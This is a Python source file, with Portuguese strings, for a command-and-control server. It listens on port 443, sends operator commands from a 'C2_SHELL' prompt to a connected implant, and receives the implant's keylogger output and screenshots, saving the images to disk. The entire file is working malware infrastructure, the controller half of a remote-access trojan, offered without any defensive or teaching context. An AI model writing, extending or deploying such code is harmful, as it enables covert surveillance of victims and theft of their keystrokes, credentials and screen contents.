import socket
import sys
import threading
import protocolo

LISTEN_IP = "0.0.0.0"
PORT = 443
SOCKET_TIMEOUT = 1.0

def receive_handler(client_socket):
    while True:
        try:
            tipo, payload = protocolo.ler_mensagem(client_socket)
            
            if tipo == protocolo.MSG_TEXTO:
                print(f"\n[Texto]: {payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
                
            elif tipo == protocolo.MSG_KEYLOG:
                print(f"\n[Keylog]:\n{payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
                
            elif tipo == protocolo.MSG_IMAGEM:
                nome_arquivo = f"screenshot_{threading.get_ident()}.png"
                with open(nome_arquivo, "wb") as f:
                    f.write(payload)
                print(f"\n[+] Imagem salva intacta: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
                
        except socket.timeout:
            continue
        except RuntimeError as e:
            print(f"\n[-] Erro estrutural no fluxo de bytes: {e}")
            break
        except OSError as e:
            print(f"\n[-] Erro de E/S no socket do cliente: {e}")
            break
        except Exception as e:
            print(f"\n[!] Exceção inesperada interna da thread: {type(e).__name__} -> {e}")
            break
    print("\n[*] Encerrando thread de recepção de dados.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Escutando em {LISTEN_IP}:{PORT}...")
    except OSError as e:
        print(f"[!] Erro ao realizar o bind na porta {PORT}: {e}")
        sys.exit(1)
        
    try:
        client_socket, client_address = server.accept()
        print(f"[+] Conexão aceita originada de {client_address[0]}:{client_address[1]}")
        
        client_socket.settimeout(SOCKET_TIMEOUT)
        
        recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
        recv_thread.start()
        
        while True:
            try:
                command = input("C2_SHELL> ").strip()
                if not command:
                    continue
                    
                protocolo.enviar_mensagem(client_socket, protocolo.MSG_TEXTO, command.encode('utf-8'))
                
                if command == "/exit":
                    print("[*] Encerrando sessão por comando do operador.")
                    break
            except KeyboardInterrupt:
                break
            except OSError as e:
                print(f"[-] Erro ao enviar comando para o cliente: {e}")
                break
                    
    except KeyboardInterrupt:
        print("\n[*] Interrupção detectada. Finalizando servidor...")
    except Exception as e:
        print(f"\n[!] Falha grave no loop principal do servidor: {type(e).__name__} -> {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
